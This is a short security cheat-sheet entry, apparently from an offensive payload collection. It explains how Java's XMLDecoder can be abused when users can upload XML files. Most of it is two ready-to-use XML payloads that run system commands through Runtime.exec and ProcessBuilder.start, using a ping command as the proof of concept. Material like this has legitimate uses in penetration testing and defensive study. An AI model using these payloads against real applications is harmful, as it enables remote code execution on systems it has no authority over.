# XMLDecoder

## XMLDecoder

XMLDecoder is a java class which creates object from XML files.

If this class is used and the user is able to upload XML files, we can try to abuse the following methods

### Runtime object and exec method

We can create a Runtime object using :

```csharp
<object class="java.lang.Runtime" method="getRuntime">
```

And call the exec method :

```csharp
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="3">
          <void index="0">
              <string>/usr/bin/ping</string>
          </void>
          <void index="1">
              <string>-c</string>
          </void>
          <void index="2">
              <string>9999</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

### ProcessBuilder object and start method

```csharp
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>/usr/bin/ping</string>
      </void>
      <void index="1">
         <string>-c</string>
      </void>
      <void index="2">
         <string>9999</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```



